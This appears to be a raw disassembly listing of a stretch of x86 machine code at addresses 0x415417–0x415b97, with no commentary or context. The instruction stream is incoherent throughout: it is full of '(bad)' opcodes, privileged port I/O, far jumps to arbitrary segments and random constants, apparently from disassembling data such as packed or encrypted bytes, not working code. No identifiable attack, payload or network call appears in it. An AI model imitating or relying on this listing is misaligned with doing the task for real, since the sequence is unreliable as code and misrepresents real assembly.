  415417:	and    ebp,DWORD PTR [eax-0x52]
  41541a:	add    esp,edx
  41541c:	jmp    0x59ad963
  415421:	and    BYTE PTR [ebx+0x37ac9b60],al
  415427:	imul   edx,DWORD PTR [edi+0x3],0xa6deb2a0
  41542e:	cs retf 
  415430:	rcl    BYTE PTR [esi+0x74011393],1
  415436:	dec    edi
  415437:	jle    0x41540d
  415439:	jp     0x4153e5
  41543b:	add    eax,0xe229e53e
  415440:	imul   eax,DWORD PTR [ecx],0xa63b8445
  415446:	cdq    
  415447:	sahf   
  415448:	enter  0xb1a2,0xf1
  41544c:	cli    
  41544d:	mov    dl,0x2c
  41544f:	repnz and al,0xad
  415452:	shl    ebp,0x8f
  415455:	(bad)  
  415456:	lahf   
  415457:	mov    dh,0x34
  415459:	pop    ebp
  41545a:	and    al,cl
  41545c:	and    esi,esi
  41545e:	repnz xchg esp,eax
  415460:	mov    ds:0x3ee00310,eax
  415465:	jl     0x41544a
  415467:	daa    
  415468:	mov    edi,0xa2eba253
  41546d:	push   edi
  41546e:	adc    al,0x32
  415470:	jp     0x415419
  415472:	push   esi
  415473:	sub    BYTE PTR [edi-0x72a88a8c],dl
  415479:	push   edx
  41547a:	mov    WORD PTR [esp+esi*2+0x66],cs
  41547e:	test   eax,0x765a7a1
  415483:	mov    DWORD PTR [ecx+0x8e2dd48],esi
  415489:	pop    ebx
  41548a:	in     al,0x21
  41548c:	sub    al,al
  41548e:	push   0x67
  415490:	dec    esp
  415491:	pop    ebx
  415492:	sbb    BYTE PTR [edi],0x3d
  415495:	js     0x4154b5
  415497:	adc    al,0x7e
  415499:	pusha  
  41549a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41549b:	sub    DWORD PTR [esi],ebp
  41549d:	lea    ebp,[ebx+ebp*1-0x28]
  4154a1:	out    0x7a,eax
  4154a3:	xchg   edx,eax
  4154a4:	mov    eax,DWORD PTR [edi-0x1d]
  4154a7:	jp     0x4154f5
  4154a9:	mov    bh,0x77
  4154ab:	test   eax,0x84943e9f
  4154b0:	jecxz  0x415447
  4154b2:	xchg   ecx,eax
  4154b3:	pushf  
  4154b4:	mov    ch,0x3a
  4154b6:	adc    DWORD PTR [edi-0x75d1b710],ebx
  4154bc:	ror    al,0x2d
  4154bf:	pop    edi
  4154c0:	dec    edi
  4154c1:	xlat   BYTE PTR ds:[ebx]
  4154c2:	pop    es
  4154c3:	mov    ch,0x4c
  4154c5:	nop
  4154c6:	mov    dl,0x34
  4154c8:	pop    edi
  4154c9:	ret    
  4154ca:	les    edi,FWORD PTR [ebp-0x42]
  4154cd:	inc    ecx
  4154ce:	aaa    
  4154cf:	in     eax,dx
  4154d0:	(bad)
  4154d5:	dec    edi
  4154d6:	cs adc al,0x89
  4154d9:	xor    BYTE PTR [edi-0x21bad35b],ch
  4154df:	push   ds
  4154e0:	(bad)  
  4154e1:	je     0x41549e
  4154e3:	dec    esi
  4154e4:	(bad)  
  4154e5:	popf   
  4154e6:	push   es
  4154e7:	cmp    BYTE PTR [edi],bl
  4154e9:	enter  0x5446,0x8b
  4154ed:	mov    ah,BYTE PTR [edi]
  4154ef:	repnz scas eax,DWORD PTR es:[edi]
  4154f1:	in     eax,dx
  4154f2:	ror    ch,cl
  4154f4:	call   0xef035508
  4154f9:	pop    edx
  4154fa:	jle    0x415517
  4154fc:	xlat   BYTE PTR ds:[ebx]
  4154fd:	sbb    ebx,edx
  4154ff:	test   eax,0xba3acf65
  415504:	mov    ch,0x9a
  415506:	adc    ch,ch
  415508:	mov    bl,0x4e
  41550a:	or     al,0x8a
  41550c:	fmul   QWORD PTR [ebx-0x70596a0]
  415512:	cld    
  415513:	xchg   ecx,eax
  415514:	sti    
  415515:	loope  0x4154d3
  415517:	cmc    
  415518:	pop    eax
  415519:	or     al,BYTE PTR [esi-0x4e]
  41551c:	mul    DWORD PTR [esi+0x3cc3bb57]
  415522:	aaa    
  415523:	push   ds
  415524:	lds    ecx,FWORD PTR [edi-0x73]
  415527:	repz (bad) 
  415529:	or     BYTE PTR [ecx-0x42],ch
  41552c:	mov    bl,BYTE PTR [edi+0x7e]
  41552f:	push   edx
  415530:	in     eax,0x18
  415532:	xor    DWORD PTR [eax],ebx
  415534:	int3   
  415535:	push   edx
  415536:	xchg   esp,eax
  415537:	mov    bh,0x2f
  415539:	dec    eax
  41553a:	mov    cs,WORD PTR [eax-0x423440b3]
  415540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415541:	mov    WORD PTR [esi+eax*2-0x39],?
  415545:	jb     0x4155a5
  415547:	pushf  
  415548:	xchg   edi,eax
  415549:	xor    bh,BYTE PTR [eax]
  41554b:	ror    BYTE PTR [edx+0x22],cl
  41554e:	jo     0x415580
  415550:	aas    
  415551:	aam    0xfa
  415553:	enter  0x310c,0x16
  415557:	les    ebx,FWORD PTR [ecx-0x52]
  41555a:	fldenv [edi]
  41555c:	in     eax,0x43
  41555e:	aad    0x54
  415560:	pop    es
  415561:	dec    esi
  415562:	cmp    eax,0x4a58b14c
  415567:	jg     0x41552d
  415569:	push   eax
  41556a:	push   0xffffff80
  41556c:	mul    BYTE PTR [eax]
  41556e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41556f:	jo     0x415540
  415571:	cmp    esp,eax
  415573:	cmc    
  415574:	add    BYTE PTR [edx-0x7ec9760f],0xfa
  41557b:	mov    dh,0x7
  41557d:	cmc    
  41557e:	jge    0x41550e
  415580:	jo     0x4155f9
  415582:	iret   
  415583:	repnz inc esi
  415585:	adc    BYTE PTR ds:0xf9a88944,bh
  41558b:	xchg   edi,eax
  41558c:	rcr    DWORD PTR [edi],cl
  41558e:	mov    ecx,esi
  415590:	cmp    BYTE PTR [edi+eiz*8],0x8d
  415594:	ret    
  415595:	or     eax,0x14d00fe6
  41559a:	pop    ebx
  41559b:	mov    ds:0x6c26ce00,eax
  4155a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155a1:	mov    ebx,0x5de8f568
  4155a6:	popf   
  4155a7:	retw   
  4155a9:	jecxz  0x41557b
  4155ab:	lods   al,BYTE PTR ds:[esi]
  4155ac:	out    0x4b,eax
  4155ae:	ds cmp eax,0xd59866af
  4155b4:	sar    DWORD PTR [eax+0x7b],1
  4155b7:	mov    al,0xd5
  4155b9:	in     al,dx
  4155ba:	mov    esi,0x2030de2f
  4155bf:	dec    ebx
  4155c0:	inc    esi
  4155c1:	jno    0x57866204
  4155c7:	test   DWORD PTR [ecx-0x3192aae8],0x75eb5d54
  4155d1:	xchg   ebp,eax
  4155d2:	clc    
  4155d3:	xor    bp,WORD PTR [ebx+0x15]
  4155d7:	inc    ecx
  4155d8:	stos   BYTE PTR es:[edi],al
  4155d9:	cs dec ecx
  4155db:	arpl   bp,bx
  4155dd:	xor    dh,bh
  4155df:	sbb    esi,esp
  4155e1:	popf   
  4155e2:	retf   
  4155e3:	in     eax,dx
  4155e4:	mov    ch,BYTE PTR [edi-0x660ad38e]
  4155ea:	sub    ah,ah
  4155ec:	inc    esi
  4155ed:	fwait
  4155ee:	das    
  4155ef:	sub    BYTE PTR [edi],0x48
  4155f2:	cli    
  4155f3:	push   0x5
  4155f5:	adc    al,0xb0
  4155f7:	sahf   
  4155f8:	push   ds
  4155f9:	ins    BYTE PTR es:[edi],dx
  4155fa:	inc    esi
  4155fb:	mov    ds:0xb01310fc,eax
  415600:	sbb    ah,BYTE PTR [ebx+0x6344a121]
  415606:	ffree  st(4)
  415608:	shl    DWORD PTR [ecx+0x1d],cl
  41560b:	fucomp st(6)
  41560d:	sub    BYTE PTR [edx+0x27],al
  415610:	stc    
  415611:	push   esp
  415612:	pusha  
  415613:	jne    0x415663
  415615:	xor    ch,BYTE PTR [ebx-0x18]
  415618:	ret    
  415619:	pop    ds
  41561a:	retf   
  41561b:	sub    eax,0x13ef435b
  415620:	ret    0xc7fe
  415623:	xchg   ebx,eax
  415624:	frstor [esi-0x2d]
  415627:	push   esp
  415628:	xchg   edx,eax
  415629:	cmp    al,0xa4
  41562b:	ss loope 0x4156a5
  41562e:	mov    bh,0x81
  415630:	xchg   ebx,eax
  415631:	dec    eax
  415632:	pop    esi
  415633:	inc    eax
  415634:	loope  0x41561d
  415636:	retf   0x11fb
  415639:	sub    eax,0x819c5ae2
  41563e:	push   0x6
  415640:	push   ebp
  415641:	or     DWORD PTR [edx+edi*8-0x14],0x46
  415646:	sub    ch,BYTE PTR [ebx-0x77]
  415649:	stc    
  41564a:	sbb    BYTE PTR [esi-0x46],0xdc
  41564e:	mov    eax,DWORD PTR [ebp+0x1d386f2c]
  415654:	shl    BYTE PTR [esi-0x36],0x0
  415658:	cmp    al,0xfd
  41565b:	call   0x181d:0x40b88b8
  415662:	add    BYTE PTR [ecx+0x10093fb],bl
  415668:	sbb    al,0xe2
  41566a:	test   BYTE PTR [ebx],ah
  41566c:	outs   dx,DWORD PTR ds:[esi]
  41566d:	loopne 0x415664
  41566f:	sub    al,0x2d
  415671:	adc    ecx,DWORD PTR [eax]
  415673:	inc    edi
  415674:	stos   BYTE PTR es:[edi],al
  415675:	stc    
  415676:	imul   edi,DWORD PTR [ebx+0x58],0x23
  41567a:	inc    ebp
  41567b:	test   al,0x9f
  41567d:	aad    0x8d
  41567f:	cwde   
  415680:	push   ebp
  415681:	mul    DWORD PTR [edi+eiz*1]
  415684:	add    DWORD PTR [ebx],esi
  415686:	fdiv   QWORD PTR [eax-0x2c]
  415689:	cmp    al,0xb8
  41568b:	inc    eax
  41568c:	stos   BYTE PTR es:[edi],al
  41568d:	jb     0x4156f6
  41568f:	xor    esp,DWORD PTR [ebp+esi*2+0x1816e800]
  415696:	jbe    0x4156a9
  415698:	mov    edi,DWORD PTR [edi-0x2a162f1d]
  41569e:	mov    edx,0xacb7e2f0
  4156a3:	js     0x415673
  4156a5:	ficom  WORD PTR [ebx-0x3a]
  4156a8:	sar    BYTE PTR [ebp+esi*1+0x77cd7404],1
  4156af:	aad    0xdb
  4156b1:	retf   0x51c
  4156b4:	cmp    DWORD PTR [ebp+0x197a3c40],0x50e70d20
  4156be:	jb     0x4156e8
  4156c0:	sub    eax,0x19cc4234
  4156c5:	shr    BYTE PTR [esi-0x69add1ed],cl
  4156cb:	lds    ecx,FWORD PTR [edi+ebp*8-0x55]
  4156cf:	sti    
  4156d0:	sbb    DWORD PTR [ecx+0x1739e6df],ebx
  4156d6:	mov    al,0x57
  4156d8:	push   ebx
  4156d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156da:	aam    0x27
  4156dc:	sbb    eax,0x5e155cab
  4156e1:	pop    edx
  4156e2:	fcomp  DWORD PTR [esi]
  4156e4:	and    edx,edi
  4156e6:	mov    edx,0xb06d7c1d
  4156eb:	retf   0x7ed6
  4156ee:	ds push cs
  4156f0:	retf   
  4156f1:	scas   eax,DWORD PTR es:[edi]
  4156f2:	out    0x7,eax
  4156f4:	cmp    BYTE PTR [edi+0x2e05d670],bl
  4156fa:	xchg   ecx,eax
  4156fb:	add    ecx,DWORD PTR [eax+eiz*1]
  4156fe:	xor    DWORD PTR [edx+eiz*1+0x2ed22604],0x8
  415706:	pop    ss
  415707:	xor    al,0x44
  415709:	inc    esi
  41570a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41570b:	sub    BYTE PTR [edi+0x8edbdd0],dh
  415711:	jge    0x415783
  415713:	jmp    0x41573e
  415715:	pop    ss
  415716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415717:	out    dx,al
  415718:	fs inc eax
  41571a:	pop    ds
  41571b:	ss int 0x88
  41571e:	shr    BYTE PTR ds:0x15eb94a0,1
  415724:	pop    esp
  415725:	mov    edi,0x5038831e
  41572a:	xchg   edi,eax
  41572b:	loope  0x4157a1
  41572d:	aaa    
  41572e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41572f:	jmp    0xde89:0x3e7034ee
  415736:	xor    esp,DWORD PTR [esi+0x9dcaf66]
  41573c:	ins    BYTE PTR es:[edi],dx
  41573d:	call   0xf7032671
  415742:	pop    ebp
  415743:	(bad)  
  415745:	sahf   
  415746:	mov    bh,0x19
  415748:	fild   DWORD PTR [ebx+ebx*4-0x73]
  41574c:	xor    al,0x40
  41574e:	retf   0xa31e
  415751:	pop    es
  415752:	xchg   ch,bl
  415754:	mov    ah,0x38
  415756:	repnz in al,0xe0
  415759:	std    
  41575a:	sub    eax,0xaddf198f
  41575f:	mov    edi,0x7641407b
  415764:	sub    eax,0xbd36fedc
  415769:	sahf   
  41576a:	adc    DWORD PTR [edi],0x62cdd843
  415770:	shl    DWORD PTR [ecx+0x16],0xda
  415774:	fwait
  415775:	div    DWORD PTR [esi-0x4b]
  415778:	int3   
  415779:	into   
  41577a:	leave  
  41577b:	mov    bl,0xbd
  41577d:	inc    edi
  41577e:	dec    esi
  41577f:	mov    WORD PTR [ebx+0x1cb4d2f6],gs
  415785:	bound  esi,QWORD PTR [edi+0x60abcbfa]
  41578b:	(bad)  
  41578c:	cmp    eax,0x8eed473d
  415791:	addr16 inc eax
  415793:	push   edx
  415794:	mov    BYTE PTR ds:0xe9930151,ah
  41579a:	(bad)  
  41579b:	mov    edx,0xb835ba19
  4157a0:	sub    BYTE PTR [eax],bh
  4157a2:	inc    ecx
  4157a3:	adc    esp,0x7b8d1077
  4157a9:	or     BYTE PTR [ecx+ebx*2],cl
  4157ac:	or     cl,BYTE PTR [esi]
  4157ae:	xchg   edi,eax
  4157af:	lea    ebp,[edx-0x45]
  4157b2:	stos   BYTE PTR es:[edi],al
  4157b3:	(bad)  [esi-0x3c9e1df]
  4157b9:	shl    BYTE PTR [edi-0x21a8cfaf],cl
  4157bf:	add    al,0x15
  4157c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157c2:	mov    edi,0x822175ac
  4157c7:	xor    al,0xdf
  4157c9:	xor    edx,edi
  4157cb:	rcl    BYTE PTR [ecx],cl
  4157cd:	push   ebp
  4157ce:	jae    0x41578a
  4157d0:	xchg   esp,eax
  4157d1:	mov    ?,WORD PTR [edx+0x72]
  4157d4:	scas   eax,DWORD PTR es:[edi]
  4157d5:	pushf  
  4157d6:	mov    bl,0x31
  4157d8:	sub    ecx,0xfffffff9
  4157db:	dec    ebx
  4157dc:	arpl   sp,dx
  4157de:	rcl    DWORD PTR [ebp+0x7eea462c],0x64
  4157e5:	fs stos DWORD PTR es:[edi],eax
  4157e7:	jp     0x4157ef
  4157e9:	aad    0xbc
  4157eb:	imul   eax,DWORD PTR [eax-0x38],0xe39b8f9e
  4157f2:	push   ebp
  4157f3:	(bad)  
  4157f4:	std    
  4157f5:	stos   BYTE PTR es:[edi],al
  4157f6:	pop    esi
  4157f7:	je     0x415873
  4157f9:	jmp    0xbabc0f2d
  4157fe:	push   ds
  4157ff:	sti    
  415800:	faddp  st(6),st
  415802:	stos   BYTE PTR es:[edi],al
  415803:	(bad)  
  415804:	xor    eax,DWORD PTR [ebx+0x44]
  415807:	loopne 0x41578d
  415809:	out    0x7,al
  41580b:	test   BYTE PTR [esi],dh
  41580d:	jp     0x415839
  41580f:	jo     0x415870
  415811:	xlat   BYTE PTR ds:[ebx]
  415812:	arpl   WORD PTR [ebx-0x54798e45],bp
  415818:	adc    BYTE PTR ds:0x6a632246,bh
  41581e:	ins    BYTE PTR es:[edi],dx
  41581f:	mov    ebx,0xac2cfb74
  415824:	lea    ebp,[edi]
  415826:	(bad)  
  415828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41582a:	adc    edi,ebx
  41582c:	pop    esp
  41582d:	mov    bl,BYTE PTR [edi+eax*1+0x73]
  415831:	xchg   esi,eax
  415832:	imul   eax,DWORD PTR [ebp+0x4da48c08],0x586d0580
  41583c:	dec    ebp
  41583d:	stos   DWORD PTR es:[edi],eax
  41583e:	or     eax,0x320e26d5
  415843:	push   esi
  415844:	je     0x415824
  415846:	dec    esi
  415847:	lods   al,BYTE PTR ds:[esi]
  415848:	mov    BYTE PTR [ebx+eax*4+0x798446a6],ah
  41584f:	std    
  415850:	push   esi
  415851:	mov    ss,WORD PTR [ebp+0x25]
  415854:	test   eax,0x9100c732
  415859:	jb     0x41589b
  41585b:	out    0xd2,eax
  41585d:	fldenv [esi+0x4c]
  415860:	ins    DWORD PTR es:[edi],dx
  415861:	pop    ebx
  415862:	or     ebx,DWORD PTR [eax-0x3f33914f]
  415868:	pop    ebp
  415869:	push   ebx
  41586a:	dec    esi
  41586b:	push   ebx
  41586c:	divps  xmm3,XMMWORD PTR [ebx+esi*8+0x66]
  415871:	shl    esp,1
  415873:	jo     0x41584b
  415875:	sbb    al,0x5c
  415877:	leave  
  415878:	sub    ebx,DWORD PTR [bp+si]
  41587b:	popa   
  41587c:	jge    0x4158bc
  41587e:	adc    BYTE PTR [edx+edi*8-0x7557420e],cl
  415885:	mov    ch,0x9d
  415887:	outs   dx,BYTE PTR ds:[esi]
  415888:	cmp    DWORD PTR [esi-0x6e],esp
  41588b:	mov    ah,0xc1
  41588d:	xor    DWORD PTR [edi],ecx
  41588f:	sbb    al,0x52
  415891:	mov    DWORD PTR [esi+0x11],esp
  415894:	stc    
  415895:	popf   
  415896:	push   esp
  415897:	shl    BYTE PTR [ebp+0x175bb4a0],1
  41589d:	mov    ebx,0x9a18741b
  4158a2:	ss jb  0x4158bb
  4158a5:	or     DWORD PTR [ecx+0x16d664d4],ebx
  4158ab:	shr    DWORD PTR [edi+0x1],1
  4158ae:	sbb    eax,0xa2a0fb04
  4158b3:	dec    ebx
  4158b4:	push   es
  4158b5:	(bad)  
  4158b6:	mov    ebp,0x41b769b3
  4158bb:	mov    esi,0xe81b8482
  4158c0:	jmp    0x490:0x8a5b5b86
  4158c7:	loop   0x4158d7
  4158c9:	adc    eax,DWORD PTR [esi-0xf]
  4158cc:	sub    dh,BYTE PTR [ecx-0x1a]
  4158cf:	scas   al,BYTE PTR es:[edi]
  4158d0:	xchg   ebx,eax
  4158d1:	rcl    bl,0xd
  4158d4:	jo     0x4158a7
  4158d6:	or     ebp,DWORD PTR [eax+0x199db51b]
  4158dc:	dec    esp
  4158dd:	push   es
  4158de:	(bad)  
  4158e0:	repnz dec ecx
  4158e2:	fwait
  4158e3:	pop    ebx
  4158e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158e5:	(bad)  
  4158e6:	pop    eax
  4158e7:	mov    esi,0x40b72fa
  4158ec:	inc    edx
  4158ed:	jmp    0xbc:0x8ec5ebd5
  4158f4:	cmc    
  4158f5:	outs   dx,DWORD PTR ds:[esi]
  4158f6:	test   BYTE PTR [ebp-0x4baaf48],bl
  4158fc:	into   
  4158fd:	sub    eax,0x8054bea1
  415902:	inc    esp
  415903:	jo     0x415966
  415905:	xor    DWORD PTR [esi-0x26],0xffffffc1
  415909:	sub    eax,0xf5320e98
  41590e:	in     eax,0x14
  415910:	sar    BYTE PTR [edx-0xda87b1f],cl
  415916:	mov    dh,0x20
  415918:	dec    eax
  415919:	js     0x415940
  41591b:	lods   al,BYTE PTR ds:[esi]
  41591c:	jns    0x41598d
  41591e:	sub    al,0x5f
  415920:	stos   BYTE PTR es:[edi],al
  415921:	jl     0x415949
  415923:	das    
  415924:	in     eax,0x6b
  415926:	fistp  WORD PTR [eax+esi*2-0x3ce11083]
  41592d:	pushf  
  41592e:	mov    ds:0xb30ca79e,eax
  415933:	adc    eax,0x8c783d21
  415938:	dec    edi
  415939:	xchg   esi,eax
  41593a:	adc    eax,0x5b678ee0
  41593f:	pop    ebx
  415940:	aam    0x83
  415942:	or     eax,0xaddd4bcb
  415947:	mov    edi,0xa7a1cac8
  41594c:	adc    cl,BYTE PTR [eax+0x14]
  41594f:	jecxz  0x415924
  415951:	rol    DWORD PTR [esi],0x9b
  415954:	stos   DWORD PTR es:[edi],eax
  415955:	enter  0xcb4d,0xb2
  415959:	dec    eax
  41595a:	jnp    0x415995
  41595c:	clc    
  41595d:	push   ecx
  41595e:	fs push ebx
  415960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415961:	ja     0x415970
  415963:	fldcw  WORD PTR ds:0x82d3ae26
  415969:	test   BYTE PTR [ecx+edi*1],0x4c
  41596d:	outs   dx,BYTE PTR ds:[esi]
  41596e:	ins    BYTE PTR es:[edi],dx
  41596f:	mov    ah,0xc4
  415971:	es push 0x6d
  415974:	xchg   esp,eax
  415975:	and    DWORD PTR [ecx],0x4a
  415978:	or     DWORD PTR [ecx],0x5
  41597b:	and    esp,esi
  41597d:	and    bl,BYTE PTR ds:0x6ba6b9f6
  415983:	(bad)  
  415984:	xchg   edi,eax
  415985:	pop    ecx
  415986:	loopne 0x415963
  415988:	inc    esi
  415989:	clc    
  41598a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41598b:	or     eax,DWORD PTR [eax]
  41598d:	imul   ebp,ecx,0x8
  415990:	dec    eax
  415991:	test   DWORD PTR [esi],ebp
  415993:	xor    DWORD PTR [ecx],edi
  415995:	inc    ebp
  415996:	sar    DWORD PTR [edi-0x5d],1
  415999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41599a:	push   0x3304b456
  41599f:	bound  edi,QWORD PTR [esi-0x10eca11b]
  4159a5:	dec    ecx
  4159a6:	out    dx,eax
  4159a7:	cmp    ch,cl
  4159a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159aa:	xchg   ebp,eax
  4159ab:	leave  
  4159ac:	fistp  WORD PTR [ebx-0x27]
  4159af:	inc    ebp
  4159b0:	jbe    0x415a03
  4159b2:	jg     0x41597f
  4159b4:	jnp    0x4159e6
  4159b6:	xchg   esp,eax
  4159b7:	xor    al,0x1b
  4159b9:	or     eax,0x4bb3c2ff
  4159be:	bnd jg 0x41599c
  4159c1:	in     eax,0xa8
  4159c3:	sub    ebx,DWORD PTR [edx-0x6]
  4159c6:	inc    esp
  4159c7:	repz mov edi,0xa28cf8b4
  4159cd:	sahf   
  4159ce:	jl     0x415a29
  4159d0:	imul   eax,DWORD PTR [edx],0x64
  4159d3:	dec    ebx
  4159d4:	mov    dl,0xfe
  4159d6:	or     al,0xe1
  4159d8:	clc    
  4159d9:	into   
  4159da:	in     eax,0x9a
  4159dc:	or     BYTE PTR [edx+0x131353df],bh
  4159e2:	sahf   
  4159e3:	jo     0x4159f2
  4159e5:	aad    0xdd
  4159e7:	repz mov bl,0x3e
  4159ea:	out    0xb0,eax
  4159ec:	imul   ebx,DWORD PTR [ebx],0xc9a1ee29
  4159f2:	iret   
  4159f3:	arpl   WORD PTR [esi-0x9689c77],si
  4159f9:	push   es
  4159fa:	ja     0x415993
  4159fc:	mov    esp,0x9f4a2468
  415a01:	mov    edi,0x595e45ed
  415a06:	fnsave [eax+0x2eba289d]
  415a0c:	div    DWORD PTR [edx+ebp*1+0x179044f7]
  415a13:	pop    edi
  415a14:	sub    DWORD PTR [ecx+edx*2-0x2845ee0a],ebp
  415a1b:	adc    edi,ecx
  415a1d:	inc    eax
  415a1e:	inc    edi
  415a1f:	push   esp
  415a20:	pop    es
  415a21:	jno    0x415a21
  415a23:	(bad)  
  415a24:	adc    al,0x76
  415a26:	not    DWORD PTR [ebx]
  415a28:	test   DWORD PTR [ecx+0x15],ecx
  415a2b:	push   0x16
  415a2d:	(bad)  
  415a2e:	xchg   esp,eax
  415a2f:	es ins BYTE PTR es:[edi],dx
  415a31:	loopne 0x415a3e
  415a33:	mov    dh,BYTE PTR [ecx+ebp*1-0x60]
  415a37:	push   eax
  415a38:	popa   
  415a39:	push   0x6b1edda0
  415a3e:	inc    eax
  415a3f:	das    
  415a40:	pop    esp
  415a41:	leave  
  415a42:	add    al,0xcb
  415a44:	outs   dx,DWORD PTR gs:[esi]
  415a46:	push   eax
  415a47:	imul   esi,edx,0xffffffd9
  415a4a:	or     DWORD PTR [edx+0x57],esi
  415a4d:	xlat   BYTE PTR ds:[ebx]
  415a4e:	push   ds
  415a4f:	xchg   edx,eax
  415a50:	jmp    0x1b76:0xfd0f972d
  415a57:	or     BYTE PTR [ebx-0x63],0x53
  415a5b:	dec    ecx
  415a5c:	aam    0x91
  415a5e:	cmp    edx,DWORD PTR [esi+0x2f357d48]
  415a64:	cmc    
  415a65:	dec    eax
  415a66:	sub    al,BYTE PTR [ebx+ecx*4]
  415a69:	(bad)  [eax+0x75]
  415a6c:	les    esp,FWORD PTR [edi+0x7c57e2d5]
  415a72:	mov    gs,WORD PTR [edi+ecx*8-0x21]
  415a76:	ins    DWORD PTR es:[edi],dx
  415a77:	iret   
  415a78:	adc    al,0x2
  415a7a:	dec    esi
  415a7b:	adc    BYTE PTR [edi+0x79],0xab
  415a7f:	mov    esi,edx
  415a81:	mov    bl,BYTE PTR [ecx]
  415a83:	repz adc ebx,DWORD PTR [ebx+edi*4-0x29]
  415a88:	shr    ch,1
  415a8a:	mov    bl,0x20
  415a8c:	(bad)  
  415a8d:	mov    ch,0x3b
  415a8f:	xlat   BYTE PTR ds:[ebx]
  415a90:	and    al,0x2e
  415a92:	adc    al,0x6a
  415a94:	xchg   esi,eax
  415a95:	inc    esp
  415a96:	pop    esi
  415a97:	and    BYTE PTR [ecx],0xc2
  415a9a:	pop    esp
  415a9b:	mov    eax,esp
  415a9d:	cld    
  415a9e:	xor    eax,0xfbb1b441
  415aa3:	stos   DWORD PTR es:[edi],eax
  415aa4:	fimul  WORD PTR [ebp-0x1c]
  415aa7:	lods   al,BYTE PTR ds:[esi]
  415aa8:	or     al,0xce
  415aaa:	sbb    al,0x5e
  415aac:	es in  al,0xd4
  415aaf:	not    BYTE PTR [eax+ebx*8-0x36f49a1b]
  415ab6:	jne    0x415a5b
  415ab8:	mov    cl,0xa9
  415aba:	imul   ebx
  415abc:	add    dh,dl
  415abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415abf:	sbb    ch,al
  415ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ac2:	pop    ss
  415ac3:	test   al,0x7b
  415ac5:	icebp  
  415ac6:	inc    ebx
  415ac7:	and    ebp,DWORD PTR [ebx+0x62]
  415aca:	pop    ecx
  415acb:	pop    eax
  415acc:	xor    al,0x23
  415ace:	cmp    DWORD PTR [edi+0x59],eax
  415ad1:	xchg   esp,eax
  415ad2:	jge    0x415ae6
  415ad4:	sub    al,0xad
  415ad6:	(bad)  [ecx-0x44]
  415ad9:	cli    
  415ada:	outs   dx,DWORD PTR ds:[esi]
  415adb:	scas   al,BYTE PTR es:[edi]
  415adc:	jne    0x415a8b
  415ade:	fs mov edi,0x9ad54fde
  415ae4:	ins    DWORD PTR es:[edi],dx
  415ae5:	scas   al,BYTE PTR es:[edi]
  415ae6:	add    al,0xa5
  415ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ae9:	xchg   edi,eax
  415aea:	out    dx,al
  415aeb:	popf   
  415aec:	lock adc BYTE PTR [esi-0x30b6ca99],dl
  415af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415af4:	xchg   ebp,eax
  415af5:	scas   al,BYTE PTR es:[edi]
  415af6:	jg     0x415b26
  415af8:	rcr    DWORD PTR ss:[ebx-0x52],cl
  415afc:	push   ebp
  415afd:	xchg   esi,eax
  415afe:	rcl    BYTE PTR cs:[eax+0x22],0xa0
  415b03:	xor    dh,BYTE PTR [eax]
  415b05:	loope  0x415af0
  415b07:	ret    
  415b08:	mov    edx,0x86eb579e
  415b0d:	inc    edi
  415b0e:	arpl   WORD PTR [esi-0x14],sp
  415b11:	ret    
  415b12:	dec    eax
  415b13:	mov    eax,ds:0x2bda796e
  415b18:	or     edi,DWORD PTR [esi-0x15]
  415b1b:	dec    ecx
  415b1c:	lods   al,BYTE PTR ss:[esi]
  415b1e:	dec    eax
  415b1f:	aaa    
  415b20:	and    BYTE PTR [ebx+0x21],dl
  415b23:	cwde   
  415b24:	add    ecx,esp
  415b26:	gs dec esp
  415b28:	mov    al,ds:0x55a6b2ee
  415b2d:	adc    al,dh
  415b2f:	cmp    BYTE PTR [ebx],0x9a
  415b32:	fcomp  DWORD PTR [esi]
  415b34:	sbb    bh,BYTE PTR fs:[ebx]
  415b37:	es mov ch,0xcb
  415b3a:	sbb    DWORD PTR [eax-0x6f9f2de],edi
  415b40:	pop    ecx
  415b41:	in     eax,0x82
  415b43:	fwait
  415b44:	mov    cs,WORD PTR [ebp+0x6]
  415b47:	cmc    
  415b48:	jbe    0x415bc4
  415b4a:	xor    edi,DWORD PTR [ecx+0x79340f02]
  415b50:	fwait
  415b51:	pop    edi
  415b52:	sbb    BYTE PTR [edi-0x4c78888d],0x48
  415b59:	(bad)  [edx]
  415b5b:	add    al,0xc2
  415b5d:	sub    al,0xbf
  415b5f:	fs loope 0x415b14
  415b62:	xchg   esi,eax
  415b63:	or     DWORD PTR [ecx],edx
  415b65:	dec    esi
  415b66:	out    dx,al
  415b67:	cmp    eax,0xe43cec95
  415b6c:	pushf  
  415b6d:	mov    ecx,0xf7a30c9c
  415b72:	dec    ebp
  415b73:	pop    esi
  415b74:	(bad)  
  415b75:	sub    DWORD PTR [edi+0x2d],esp
  415b78:	scas   al,BYTE PTR es:[edi]
  415b79:	fwait
  415b7a:	fs inc esp
  415b7c:	mov    eax,0xd6f40517
  415b81:	in     eax,0x47
  415b83:	dec    eax
  415b84:	ror    ah,0xd5
  415b87:	es dec ecx
  415b89:	in     al,0xab
  415b8b:	stos   DWORD PTR es:[edi],eax
  415b8c:	and    dh,BYTE PTR [edx+eax*2]
  415b8f:	ret    
  415b90:	punpckldq mm1,DWORD PTR ds:0x597689de
  415b97:	(bad)  
